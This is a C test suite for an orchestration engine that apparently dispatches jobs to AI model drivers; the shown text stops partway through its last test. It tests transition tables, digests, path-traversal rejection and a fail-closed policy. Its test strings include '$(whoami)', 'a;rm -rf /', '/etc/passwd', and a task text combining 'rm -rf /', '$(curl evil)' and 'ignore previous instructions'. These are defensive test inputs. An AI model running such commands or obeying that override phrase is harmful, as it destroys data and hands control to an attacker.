/* Atlas - A8: the orchestration vocabularies, canonical identity and policy.
 * Copyright 2026 The Atlas Authors. Licensed under the Apache License 2.0.
 *
 * Everything here is a pure function — a specification in, a digest or a verdict
 * out; a file on disk in, a policy or a refusal out — so this suite needs no
 * repository, no database and no daemon.
 *
 * It asks the same functions the engine asks rather than restating their
 * answers, for the reason `tests/test_decision_model.c` gives about the A4
 * transition table: a test carrying its own copy of the rules passes by agreeing
 * with itself, and both copies can be wrong together.
 *
 * Required cases covered here: 1 (canonical encoding and digest stability),
 * 2 (identifier and token uniqueness), 4 and 5 (every allowed and every
 * forbidden transition), 29 and 30 (traversal and escape rejection at the
 * specification boundary), 40 (policy fails closed), 54 (invalid UTF-8, NULs and
 * integer boundaries).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "atlas/orch.h"
#include "atlas/orch_ops.h"
#include "atlas/orchpolicy.h"
#include "atlas_test.h"
#include "orch/policy_internal.h"
#include "support/fixture.h"

/* --- the vocabularies ------------------------------------------------------ */

static const atlas_orch_state ALL_STATES[] = {
    ATLAS_ORCH_STATE_UNKNOWN,          ATLAS_ORCH_STATE_QUEUED,
    ATLAS_ORCH_STATE_LEASED,           ATLAS_ORCH_STATE_PREPARING,
    ATLAS_ORCH_STATE_RUNNING,          ATLAS_ORCH_STATE_VALIDATING,
    ATLAS_ORCH_STATE_SUCCEEDED,        ATLAS_ORCH_STATE_FAILED,
    ATLAS_ORCH_STATE_CANCEL_REQUESTED, ATLAS_ORCH_STATE_CANCELLED,
    ATLAS_ORCH_STATE_TIMED_OUT,        ATLAS_ORCH_STATE_RECOVERY_REQUIRED};
#define NSTATES (sizeof ALL_STATES / sizeof ALL_STATES[0])

static void test_unknown_is_the_zero_state(void) {
    /* A zeroed job row is one nobody wrote correctly, and the safe reading of
     * that is never "queued". If this zero moved, a memset would start
     * producing a runnable job — which is the A6 discipline about UNKNOWN and
     * BLOCKED applied to a queue. */
    T_EQ_INT((int)ATLAS_ORCH_STATE_UNKNOWN, 0);
    T_EQ_INT((int)ATLAS_ORCH_REASON_UNKNOWN, 0);
    T_EQ_INT((int)ATLAS_ORCH_ACTOR_UNKNOWN, 0);
    T_EQ_INT((int)ATLAS_ORCH_EXIT_UNKNOWN, 0);
    T_EQ_INT((int)ATLAS_ORCHPOLICY_DISABLED, 0);
    T_EQ_INT((int)ATLAS_ORCH_OP_NONE, 0);

    atlas_orch_spec s;
    atlas_orch_spec_init(&s);
    /* An initialised specification is not yet valid: every bound is zero and
     * validation refuses it, so "forgot to fill this in" cannot run. */
    atlas_err err;
    atlas_err_init(&err);
    T_CHECK(atlas_orch_spec_validate(&s, &err) != ATLAS_OK);
    atlas_orch_spec_free(&s);
}

static void test_every_state_name_round_trips(void) {
    for (size_t i = 0; i < NSTATES; i++) {
        const char *name = atlas_orch_state_name(ALL_STATES[i]);
        atlas_orch_state back;
        if (ALL_STATES[i] == ATLAS_ORCH_STATE_UNKNOWN) {
            /* Deliberately not parseable. Nothing may ask for a job to be put
             * into the state that means "nobody wrote this row". */
            T_CHECK_MSG(!atlas_orch_state_parse(name, &back),
                        "UNKNOWN must not be reachable by name");
            continue;
        }
        T_CHECK_MSG(atlas_orch_state_parse(name, &back), "\"%s\" does not parse", name);
        T_CHECK_MSG(back == ALL_STATES[i], "\"%s\" round-tripped to something else", name);
    }
    atlas_orch_state ignored;
    T_CHECK(!atlas_orch_state_parse("queued", &ignored)); /* case matters */
    T_CHECK(!atlas_orch_state_parse("DONE", &ignored));
    T_CHECK(!atlas_orch_state_parse(NULL, &ignored));
}

static void test_every_vocabulary_member_names_itself(void) {
    /* A member with no case in its name function falls through to the
     * placeholder, so a new state, reason, actor or exit kind that nobody named
     * fails here rather than appearing in a ledger row as "UNKNOWN". */
    for (int r = 0; r <= (int)ATLAS_ORCH_REASON_ENVELOPE_INVALID; r++) {
        const char *n = atlas_orch_reason_name((atlas_orch_reason)r);
        T_CHECK_MSG(r == 0 || strcmp(n, "UNKNOWN") != 0, "reason %d has no name of its own", r);
    }
    for (int a = 0; a <= (int)ATLAS_ORCH_ACTOR_ATLAS; a++) {
        const char *n = atlas_orch_actor_name((atlas_orch_actor)a);
        T_CHECK_MSG(a == 0 || strcmp(n, "UNKNOWN") != 0, "actor %d has no name of its own", a);
    }
    for (int k = 0; k <= (int)ATLAS_ORCH_EXIT_MALFORMED_RESULT; k++) {
        const char *n = atlas_orch_exit_kind_name((atlas_orch_exit_kind)k);
        T_CHECK_MSG(k == 0 || strcmp(n, "UNKNOWN") != 0, "exit kind %d has no name of its own", k);
    }
}

/* --- the state machine ------------------------------------------------------
 *
 * The enumerated table below is the *expected* set of edges. It is written out
 * in full rather than derived, because deriving it from the function under test
 * would be the self-agreement this suite exists to avoid. Every one of the
 * 12 x 12 pairs is then checked against it, so a new edge somebody adds to the
 * implementation fails here until it is argued for here too.
 */
typedef struct edge {
    atlas_orch_state from;
    atlas_orch_state to;
} edge;

static const edge ALLOWED[] = {
    /* Out of the queue. */
    {ATLAS_ORCH_STATE_QUEUED, ATLAS_ORCH_STATE_LEASED},
    {ATLAS_ORCH_STATE_QUEUED, ATLAS_ORCH_STATE_CANCELLED},
    {ATLAS_ORCH_STATE_QUEUED, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_QUEUED, ATLAS_ORCH_STATE_FAILED},
    {ATLAS_ORCH_STATE_QUEUED, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},

    /* The pipeline, forwards only. */
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_PREPARING},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_RUNNING},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_VALIDATING},

    /* Completion. Only from RUNNING (a job with no declared validations) or
     * VALIDATING. A job cannot succeed before its driver has run. */
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_SUCCEEDED},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_SUCCEEDED},

    /* Retry: every active pipeline state may return to the queue. */
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_QUEUED},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_QUEUED},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_QUEUED},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_QUEUED},

    /* Every pipeline state may fail, be asked to cancel, time out or become
     * ambiguous. */
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_FAILED},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_FAILED},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_FAILED},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_FAILED},
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_CANCEL_REQUESTED},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_CANCEL_REQUESTED},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_CANCEL_REQUESTED},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_CANCEL_REQUESTED},
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_LEASED, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},
    {ATLAS_ORCH_STATE_PREPARING, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},
    {ATLAS_ORCH_STATE_RUNNING, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},
    {ATLAS_ORCH_STATE_VALIDATING, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},

    /* Cancellation, once requested, has no way back into the pipeline and no
     * way to success. */
    {ATLAS_ORCH_STATE_CANCEL_REQUESTED, ATLAS_ORCH_STATE_CANCELLED},
    {ATLAS_ORCH_STATE_CANCEL_REQUESTED, ATLAS_ORCH_STATE_TIMED_OUT},
    {ATLAS_ORCH_STATE_CANCEL_REQUESTED, ATLAS_ORCH_STATE_RECOVERY_REQUIRED},
};

static bool expected_allowed(atlas_orch_state from, atlas_orch_state to) {
    for (size_t i = 0; i < sizeof ALLOWED / sizeof ALLOWED[0]; i++) {
        if (ALLOWED[i].from == from && ALLOWED[i].to == to) {
            return true;
        }
    }
    return false;
}

static void test_every_transition_matches_the_enumerated_table(void) {
    for (size_t a = 0; a < NSTATES; a++) {
        for (size_t b = 0; b < NSTATES; b++) {
            bool want = expected_allowed(ALL_STATES[a], ALL_STATES[b]);
            bool got = atlas_orch_transition_allowed(ALL_STATES[a], ALL_STATES[b]);
            T_CHECK_MSG(want == got, "%s -> %s: table says %s, implementation says %s",
                        atlas_orch_state_name(ALL_STATES[a]),
                        atlas_orch_state_name(ALL_STATES[b]), want ? "allowed" : "forbidden",
                        got ? "allowed" : "forbidden");
        }
    }
}

static void test_terminal_states_never_return(void) {
    /* Stated separately from the table, because it is the property the table is
     * for: a persisted completed job stays completed, whatever else changes. */
    for (size_t a = 0; a < NSTATES; a++) {
        if (!atlas_orch_state_is_terminal(ALL_STATES[a])) {
            continue;
        }
        for (size_t b = 0; b < NSTATES; b++) {
            T_CHECK_MSG(!atlas_orch_transition_allowed(ALL_STATES[a], ALL_STATES[b]),
                        "%s is terminal but may become %s",
                        atlas_orch_state_name(ALL_STATES[a]),
                        atlas_orch_state_name(ALL_STATES[b]));
        }
    }
    /* And the pair that matters most: cancellation and completion cannot both
     * win, so there is no edge from CANCEL_REQUESTED to SUCCEEDED. */
    T_CHECK(!atlas_orch_transition_allowed(ATLAS_ORCH_STATE_CANCEL_REQUESTED,
                                           ATLAS_ORCH_STATE_SUCCEEDED));
    /* A self-transition is not a transition. */
    for (size_t a = 0; a < NSTATES; a++) {
        T_CHECK(!atlas_orch_transition_allowed(ALL_STATES[a], ALL_STATES[a]));
    }
}

/* --- declared paths --------------------------------------------------------- */

static void test_no_traversal_or_escape_survives_a_declared_path(void) {
    static const char *const BAD[] = {
        "/etc/passwd",          /* absolute */
        "../outside",           /* leading traversal */
        "a/../../b",            /* embedded traversal */
        "a/..",                 /* trailing traversal */
        "..",                   /* bare */
        ".",                    /* bare dot */
        "./a",                  /* dot component */
        "a/./b",                /* embedded dot */
        "a//b",                 /* empty component */
        "a/",                   /* trailing slash */
        "/",                    /* root */
        "",                     /* empty */
        "a\\b",                 /* backslash: not a separator here, and refused */
        "a\tb",                 /* control byte */
        "a\nb",                 /* newline */
    };
    for (size_t i = 0; i < sizeof BAD / sizeof BAD[0]; i++) {
        T_CHECK_MSG(!atlas_orch_relpath_is_safe(BAD[i], strlen(BAD[i])),
                    "\"%s\" was accepted as a declared path", BAD[i]);
    }
    /* A NUL anywhere, including at the end of otherwise fine bytes. A path that
     * validated as one thing and reached a syscall as something shorter is the
     * classic escape. */
    T_CHECK(!atlas_orch_relpath_is_safe("a\0b", 3u));
    /* Non-ASCII is refused in a *declaration*. Repository paths in general are
     * bytes and stay bytes — A0 says so and means it — but a declared prefix is
     * something a submitter typed, and keeping it narrow is what lets it be
     * compared, sorted and reported without a decoder. */
    T_CHECK(!atlas_orch_relpath_is_safe("caf\xc3\xa9", 5u));
    T_CHECK(!atlas_orch_relpath_is_safe("\xff\xfe", 2u));

    static const char *const GOOD[] = {"src", "src/orch/orch.c", "a", "a-b_c.d", "x/y/z"};
    for (size_t i = 0; i < sizeof GOOD / sizeof GOOD[0]; i++) {
        T_CHECK_MSG(atlas_orch_relpath_is_safe(GOOD[i], strlen(GOOD[i])),
                    "\"%s\" was refused as a declared path", GOOD[i]);
    }
}

/* --- canonical encodings ----------------------------------------------------- */

static void test_netstring_lists_round_trip_and_reject_rubbish(void) {
    atlas_err err;
    atlas_err_init(&err);

    atlas_buf paths[4];
    for (size_t i = 0; i < 4; i++) {
        atlas_buf_init(&paths[i]);
    }
    T_OK(atlas_buf_set_str(&paths[0], "src", &err), &err);
    T_OK(atlas_buf_set_str(&paths[1], "docs/a.md", &err), &err);
    atlas_buf enc = ATLAS_BUF_INIT;
    T_OK(atlas_orch_paths_encode(paths, 2u, &enc, &err), &err);

    atlas_buf back[4];
    for (size_t i = 0; i < 4; i++) {
        atlas_buf_init(&back[i]);
    }
    size_t n = 0;
    T_OK(atlas_orch_paths_decode(atlas_buf_cstr(&enc), back, 4u, &n, &err), &err);
    T_EQ_INT((int)n, 2);
    T_CHECK(strcmp(atlas_buf_cstr(&back[0]), "src") == 0);
    T_CHECK(strcmp(atlas_buf_cstr(&back[1]), "docs/a.md") == 0);

    /* Length-prefixed, so nothing inside an element can be mistaken for a
     * delimiter. Malformed input is refused rather than partially decoded. */
    static const char *const JUNK[] = {"", "2:", "1:", "abc", "1:x", "2:3:a,", "999999999999:x,"};
    for (size_t i = 0; i < sizeof JUNK / sizeof JUNK[0]; i++) {
        size_t m = 0;
        atlas_err e2;
        atlas_err_init(&e2);
        T_CHECK_MSG(atlas_orch_paths_decode(JUNK[i], back, 4u, &m, &e2) != ATLAS_OK,
                    "\"%s\" decoded as a path list", JUNK[i]);
    }
    /* A list longer than the cap is refused, never truncated. */
    {
        size_t m = 0;
        atlas_err e2;
        atlas_err_init(&e2);
        T_CHECK(atlas_orch_paths_decode("9:1:a,1:b,1:c,1:d,1:e,1:f,1:g,1:h,1:i,", back, 4u, &m,
                                        &e2) != ATLAS_OK);
    }

    atlas_buf_free(&enc);
    for (size_t i = 0; i < 4; i++) {
        atlas_buf_free(&paths[i]);
        atlas_buf_free(&back[i]);
    }
}

static void test_validation_argv_refuses_what_would_reach_a_child_differently(void) {
    atlas_err err;
    atlas_err_init(&err);
    atlas_orch_argv a;
    atlas_orch_argv_init(&a);

    /* Shell syntax is *not* refused, and that is deliberate: nothing in A8
     * passes a validation argument to a shell, and refusing a dollar sign would
     * imply the opposite. What is refused is anything that would arrive at
     * execve as different bytes from the ones that were validated. */
    T_OK(atlas_orch_argv_push(&a, "make", 4u, &err), &err);
    T_OK(atlas_orch_argv_push(&a, "test", 4u, &err), &err);
    T_OK(atlas_orch_argv_push(&a, "$(whoami)", 9u, &err), &err);
    T_OK(atlas_orch_argv_push(&a, "a;rm -rf /", 10u, &err), &err);
    T_EQ_INT((int)a.count, 4);

    atlas_err e2;
    atlas_err_init(&e2);
    T_CHECK(atlas_orch_argv_push(&a, "a\0b", 3u, &e2) != ATLAS_OK);
    T_CHECK(atlas_orch_argv_push(&a, "", 0u, &e2) != ATLAS_OK);
    T_CHECK(atlas_orch_argv_push(&a, "a\nb", 3u, &e2) != ATLAS_OK);
    T_CHECK(atlas_orch_argv_push(&a, "\xff", 1u, &e2) != ATLAS_OK);
    {
        char big[ATLAS_ORCH_ARG_MAX + 2u];
        memset(big, 'x', sizeof(big));
        T_CHECK(atlas_orch_argv_push(&a, big, sizeof(big), &e2) != ATLAS_OK);
    }
    atlas_orch_argv_free(&a);
}

/* --- the canonical digest ----------------------------------------------------- */

static void fill_spec(atlas_orch_spec *s) {
    atlas_err err;
    atlas_err_init(&err);
    atlas_orch_spec_init(s);
    s->submitter_uid = 1000;
    T_OK(atlas_buf_set_str(&s->repo_name, "proj", &err), &err);
    T_OK(atlas_buf_set_str(&s->repo_identity_hash,
                           "1111111111111111111111111111111111111111111111111111111111111111",
                           &err),
         &err);
    T_OK(atlas_buf_set_str(&s->source_commit, "0123456789abcdef0123456789abcdef01234567", &err),
         &err);
    T_OK(atlas_buf_set_str(&s->mode, "patch", &err), &err);
    T_OK(atlas_buf_set_str(&s->driver, "fake", &err), &err);
    T_OK(atlas_buf_set_str(&s->task_text, "add a comment", &err), &err);
    s->wall_timeout_ms = 60000;
    s->idle_timeout_ms = 30000;
    s->max_attempts = 2;
    s->max_output_bytes = 65536;
    s->max_artifact_bytes = 65536;
    s->max_artifact_count = 8;
}

static void digest_of(atlas_orch_spec *s, char out[65]) {
    atlas_err err;
    atlas_err_init(&err);
    T_OK(atlas_orch_spec_canonicalise(s, &err), &err);
    T_OK(atlas_orch_spec_digest(s, out, &err), &err);
}

static void test_the_digest_is_stable_and_covers_what_it_claims(void) {
    atlas_err err;
    atlas_err_init(&err);
    atlas_orch_spec a;
    fill_spec(&a);
    char d1[65], d2[65];
    digest_of(&a, d1);
    digest_of(&a, d2);
    T_CHECK_MSG(strcmp(d1, d2) == 0, "the digest is not stable across two calls");
    T_EQ_INT((int)strlen(d1), 64);

    /* An identical specification submitted separately digests identically —
     * that is what makes the idempotency key meaningful rather than
     * decorative. */
    atlas_orch_spec b;
    fill_spec(&b);
    char d3[65];
    digest_of(&b, d3);
    T_CHECK_MSG(strcmp(d1, d3) == 0, "two identical specifications digest differently");
    atlas_orch_spec_free(&b);

    /* Every field that changes what was asked for changes the digest. Checked
     * one at a time from a fresh copy, so a field that is silently ignored by
     * the encoder fails here. */
    struct {
        const char *what;
        void (*mutate)(atlas_orch_spec *);
    } MUTATIONS[] = {
        {"submitter", NULL},
    };
    (void)MUTATIONS;

#define MUTATE_CHECK(what, stmt)                                                       \
    do {                                                                               \
        atlas_orch_spec m;                                                             \
        fill_spec(&m);                                                                 \
        stmt;                                                                          \
        char dm[65];                                                                   \
        digest_of(&m, dm);                                                             \
        T_CHECK_MSG(strcmp(d1, dm) != 0, "changing %s did not change the digest", what); \
        atlas_orch_spec_free(&m);                                                      \
    } while (0)

    MUTATE_CHECK("the submitter", m.submitter_uid = 1001);
    MUTATE_CHECK("the repository name",
                 T_OK(atlas_buf_set_str(&m.repo_name, "other", &err), &err));
    MUTATE_CHECK("the repository identity",
                 T_OK(atlas_buf_set_str(
                          &m.repo_identity_hash,
                          "2222222222222222222222222222222222222222222222222222222222222222",
                          &err),
                      &err));
    MUTATE_CHECK("the source commit",
                 T_OK(atlas_buf_set_str(&m.source_commit,
                                        "89abcdef0123456789abcdef0123456789abcdef", &err),
                      &err));
    MUTATE_CHECK("the mode", T_OK(atlas_buf_set_str(&m.mode, "review", &err), &err));
    MUTATE_CHECK("the driver", T_OK(atlas_buf_set_str(&m.driver, "claude", &err), &err));
    MUTATE_CHECK("the task text",
                 T_OK(atlas_buf_set_str(&m.task_text, "add a comment.", &err), &err));
    MUTATE_CHECK("the wall timeout", m.wall_timeout_ms = 60001);
    MUTATE_CHECK("the idle timeout", m.idle_timeout_ms = 30001);
    MUTATE_CHECK("the attempt bound", m.max_attempts = 3);
    MUTATE_CHECK("the output bound", m.max_output_bytes = 65537);
    MUTATE_CHECK("the artifact byte bound", m.max_artifact_bytes = 65537);
    MUTATE_CHECK("the artifact count bound", m.max_artifact_count = 9);
    MUTATE_CHECK("the correlation id",
                 T_OK(atlas_buf_set_str(&m.correlation, "run7", &err), &err));
    MUTATE_CHECK("the idempotency key",
                 T_OK(atlas_buf_set_str(&m.idempotency_key, "k1", &err), &err));
    MUTATE_CHECK("a declared path", {
        T_OK(atlas_buf_set_str(&m.allowed_paths[0], "src", &err), &err);
        m.allowed_path_count = 1;
    });
    MUTATE_CHECK("a validation command", {
        T_OK(atlas_orch_argv_push(&m.validations[0], "make", 4u, &err), &err);
        m.validation_count = 1;
    });
#undef MUTATE_CHECK

    atlas_orch_spec_free(&a);
}

static void test_the_digest_is_length_prefixed_not_delimited(void) {
    /* The A4 property, restated for jobs: with any single-byte delimiter a mode
     * of "a" with a driver of "b" would encode identically to a mode of "a|b"
     * with an empty driver. Two specifications whose concatenated fields agree
     * must still digest differently. */
    atlas_err err;
    atlas_err_init(&err);
    atlas_orch_spec a, b;
    fill_spec(&a);
    fill_spec(&b);
    T_OK(atlas_buf_set_str(&a.mode, "ab", &err), &err);
    T_OK(atlas_buf_set_str(&a.driver, "cd", &err), &err);
    T_OK(atlas_buf_set_str(&b.mode, "abc", &err), &err);
    T_OK(atlas_buf_set_str(&b.driver, "d", &err), &err);
    char da[65], dbb[65];
    digest_of(&a, da);
    digest_of(&b, dbb);
    T_CHECK_MSG(strcmp(da, dbb) != 0, "adjacent fields are delimited rather than length-prefixed");
    atlas_orch_spec_free(&a);
    atlas_orch_spec_free(&b);
}

static void test_a_declared_path_set_is_order_independent(void) {
    /* A set, so the same declaration in a different order is the same
     * specification. The validation *list* is deliberately not: its order is
     * part of what was asked for, and the next check proves it. */
    atlas_err err;
    atlas_err_init(&err);
    atlas_orch_spec a, b;
    fill_spec(&a);
    fill_spec(&b);
    T_OK(atlas_buf_set_str(&a.allowed_paths[0], "src", &err), &err);
    T_OK(atlas_buf_set_str(&a.allowed_paths[1], "docs", &err), &err);
    a.allowed_path_count = 2;
    T_OK(atlas_buf_set_str(&b.allowed_paths[0], "docs", &err), &err);
    T_OK(atlas_buf_set_str(&b.allowed_paths[1], "src", &err), &err);
    /* And a duplicate, which canonicalisation removes. */
    T_OK(atlas_buf_set_str(&b.allowed_paths[2], "src", &err), &err);
    b.allowed_path_count = 3;
    char da[65], dbb[65];
    digest_of(&a, da);
    digest_of(&b, dbb);
    T_CHECK_MSG(strcmp(da, dbb) == 0, "the declared path set is order dependent");
    T_EQ_INT((int)b.allowed_path_count, 2);
    atlas_orch_spec_free(&a);
    atlas_orch_spec_free(&b);

    atlas_orch_spec c, d;
    fill_spec(&c);
    fill_spec(&d);
    T_OK(atlas_orch_argv_push(&c.validations[0], "make", 4u, &err), &err);
    T_OK(atlas_orch_argv_push(&c.validations[1], "true", 4u, &err), &err);
    c.validation_count = 2;
    T_OK(atlas_orch_argv_push(&d.validations[0], "true", 4u, &err), &err);
    T_OK(atlas_orch_argv_push(&d.validations[1], "make", 4u, &err), &err);
    d.validation_count = 2;
    char dc[65], dd[65];
    digest_of(&c, dc);
    digest_of(&d, dd);
    T_CHECK_MSG(strcmp(dc, dd) != 0, "validation order is not part of the specification");
    atlas_orch_spec_free(&c);
    atlas_orch_spec_free(&d);
}

/* --- validation --------------------------------------------------------------- */

static void test_validation_refuses_every_unbounded_or_unresolved_field(void) {
    atlas_err err;
    atlas_err_init(&err);

#define REFUSED(what, stmt)                                                        \
    do {                                                                           \
        atlas_orch_spec m;                                                         \
        fill_spec(&m);                                                             \
        stmt;                                                                      \
        atlas_err e2;                                                              \
        atlas_err_init(&e2);                                                       \
        T_CHECK_MSG(atlas_orch_spec_validate(&m, &e2) != ATLAS_OK,                 \
                    "%s was accepted", what);                                      \
        atlas_orch_spec_free(&m);                                                  \
    } while (0)

    /* A branch name is refused rather than resolved. A moving reference in a
     * stored specification is a job whose source depends on when it runs. */
    REFUSED("a branch name as the source",
            T_OK(atlas_buf_set_str(&m.source_commit, "main", &err), &err));
    REFUSED("a short commit",
            T_OK(atlas_buf_set_str(&m.source_commit, "0123456", &err), &err));
    REFUSED("an uppercase commit",
            T_OK(atlas_buf_set_str(&m.source_commit,
                                   "0123456789ABCDEF0123456789abcdef01234567", &err),
                 &err));
    REFUSED("an unlimited wall timeout", m.wall_timeout_ms = 0);
    REFUSED("a wall timeout past the absolute bound",
            m.wall_timeout_ms = ATLAS_ORCH_MAX_WALL_TIMEOUT_MS + 1);
    REFUSED("a negative wall timeout", m.wall_timeout_ms = -1);
    REFUSED("an idle timeout longer than the wall timeout", m.idle_timeout_ms = 60001);
    REFUSED("unlimited attempts", m.max_attempts = 0);
    REFUSED("attempts past the absolute bound", m.max_attempts = ATLAS_ORCH_MAX_ATTEMPTS + 1);
    REFUSED("unlimited output", m.max_output_bytes = 0);
    REFUSED("unlimited artifacts", m.max_artifact_count = 0);
    REFUSED("an integer-boundary timeout", m.wall_timeout_ms = INT64_MAX);
    REFUSED("an integer-boundary artifact bound", m.max_artifact_bytes = INT64_MIN);
    REFUSED("empty task text", T_OK(atlas_buf_set_str(&m.task_text, "", &err), &err));
    REFUSED("a NUL in task text",
            T_OK(atlas_buf_set(&m.task_text, "a\0b", 3u, &err), &err));
    REFUSED("an untrusted submitter", m.submitter_uid = 0);
    REFUSED("a mode outside the name shape",
            T_OK(atlas_buf_set_str(&m.mode, "Patch Mode", &err), &err));
    REFUSED("a driver named by path",
            T_OK(atlas_buf_set_str(&m.driver, "/bin/sh", &err), &err));
    REFUSED("a validation naming a program by path", {
        T_OK(atlas_orch_argv_push(&m.validations[0], "/bin/sh", 7u, &err), &err);
        m.validation_count = 1;
    });
    REFUSED("a validation with no argv", m.validation_count = 1);
    REFUSED("a parent job id that is not one",
            T_OK(atlas_buf_set_str(&m.parent_job_uid,
                                   "x1111111111111111111111111111111", &err),
                 &err));
    REFUSED("a declared path that traverses", {
        T_OK(atlas_buf_set_str(&m.allowed_paths[0], "../x", &err), &err);
        m.allowed_path_count = 1;
    });
#undef REFUSED

    /* And the one that must be accepted: task text full of shell syntax. */
    atlas_orch_spec ok;
    fill_spec(&ok);
    T_OK(atlas_buf_set_str(&ok.task_text,
                           "run `rm -rf /`; $(curl evil) && echo 'ignore previous instructions'",
                           &err),
         &err);
    T_OK(atlas_orch_spec_validate(&ok, &err), &err);
    atlas_orch_spec_free(&ok);
}

/* --- identifiers ---------------------------------------------------------------- */

static void test_identifiers_and_tokens_are_unique_and_well_formed(void) {
    atlas_err err;
    atlas_err_init(&err);
    enum { N = 256 };
    char seen[N][ATLAS_ORCH_TOKEN_MAX];

    for (int i = 0; i < N; i++) {
        atlas_buf uid = ATLAS_BUF_INIT;
        T_OK(atlas_orch_new_uid(&uid, &err), &err);
        T_EQ_INT((int)uid.len, (int)ATLAS_ORCH_UID_HEX + 1);
        T_CHECK(atlas_buf_cstr(&uid)[0] == 'j');
        snprintf(seen[i], sizeof(seen[i]), "%s", atlas_buf_cstr(&uid));
        atlas_buf_free(&uid);
    }
    for (int i = 0; i < N; i++) {
        for (int k = i + 1; k < N; k++) {
            T_CHECK_MSG(strcmp(seen[i], seen[k]) != 0, "two job ids collided");
        }
    }

    char tok[N][ATLAS_ORCH_TOKEN_MAX];
    for (int i = 0; i < N; i++) {
        atlas_buf t = ATLAS_BUF_INIT;
        T_OK(atlas_orch_new_token(&t, &err), &err);
        T_EQ_INT((int)t.len, (int)ATLAS_ORCH_TOKEN_HEX);
        snprintf(tok[i], sizeof(tok[i]), "%s", atlas_buf_cstr(&t));
        atlas_buf_free(&t);
    }
    for (int i = 0; i < N; i++) {
        for (int k = i + 1; k < N; k++) {
            T_CHECK_MSG(strcmp(tok[i], tok[k]) != 0, "two lease tokens collided");
        }
    }

    /* The stored form is a domain-separated digest, so the database never holds
     * a value that could be presented if it leaked. */
    char d1[65], d2[65];
    T_OK(atlas_orch_token_digest(tok[0], d1, &err), &err);
    T_OK(atlas_orch_token_digest(tok[0], d2, &err), &err);
    T_CHECK(strcmp(d1, d2) == 0);
    T_CHECK_MSG(strcmp(d1, tok[0]) != 0, "the stored digest is the token itself");
    char d3[65];
    T_OK(atlas_orch_token_digest(tok[1], d3, &err), &err);
    T_CHECK(strcmp(d1, d3) != 0);

    atlas_err e2;
    atlas_err_init(&e2);
    T_CHECK(atlas_orch_token_digest("short", d1, &e2) != ATLAS_OK);
    T_CHECK(atlas_orch_token_digest(NULL, d1, &e2) != ATLAS_OK);
    /* Uppercase hex is not the token that was issued. */
    T_CHECK(atlas_orch_token_digest(
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", d1,
                &e2) != ATLAS_OK);
}

/* --- the policy -------------------------------------------------------------------
 *
 * Required case 40. Every unprivileged shape must fail closed, and the check is
 * against real filesystem shapes rather than a description of them.
 */
static void write_file(const char *path, const char *text) {
    FILE *f = fopen(path, "w");
    T_REQUIRE(f != NULL);
    (void)fputs(text, f);
    (void)fclose(f);
}

static void test_no_unprivileged_shape_enables_orchestration(void) {
    /* This test runs as an ordinary uid. Anything it can create anywhere on the
     * filesystem must leave orchestration disabled — because if it could enable
     * it, so could `atlas-worker`, and the policy would constrain nobody. */
    atlas_err err;
    atlas_err_init(&err);
    fixture fx;
    T_OK(fx_open(&fx, &err), &err);

    char path[4096];
    (void)snprintf(path, sizeof(path), "%s/orchestration.conf", fx_data_dir(&fx));

    /* A complete, perfectly well-formed policy — written by a uid that is not
     * root. The content is not the problem; the ownership is. */
    static const char WELL_FORMED[] =
        "dispatcher_uid = 993\nsubmitter_uid = 1000\nrepo = proj\nmode = patch\n"
        "driver = fake\nworker_root = /var/lib/atlas-worker\n";
    const char *const SHAPES[] = {
        WELL_FORMED,
        "",
        "dispatcher_uid = 0\n",
        "live_model = on\n",
    };
    for (size_t i = 0; i < sizeof SHAPES / sizeof SHAPES[0]; i++) {
        write_file(path, SHAPES[i]);
        atlas_orchpolicy p;
        atlas_orchpolicy_load_at(path, &p);
        T_CHECK_MSG(p.state == ATLAS_ORCHPOLICY_DISABLED,
                    "a policy written by an unprivileged uid enabled orchestration (shape %zu)",
                    i);
        T_CHECK(!atlas_orchpolicy_is_dispatcher(&p, 993));
        T_CHECK(!atlas_orchpolicy_permits_submitter(&p, 1000));
        T_CHECK(!atlas_orchpolicy_permits_repo(&p, "proj"));
        T_CHECK(!atlas_orchpolicy_permits_driver(&p, "fake"));
    }

    /* An absent policy under a *root-owned* directory reports ABSENT: the walk
     * reached the last component and found nothing there. `/etc` is root-owned
     * on any machine this runs on, and no file is created — the point is the
     * reason, not the file. */
    {
        atlas_orchpolicy p;
        atlas_orchpolicy_load_at("/etc/atlas-orchestration-absent-probe.conf", &p);
        T_CHECK(p.state == ATLAS_ORCHPOLICY_DISABLED);
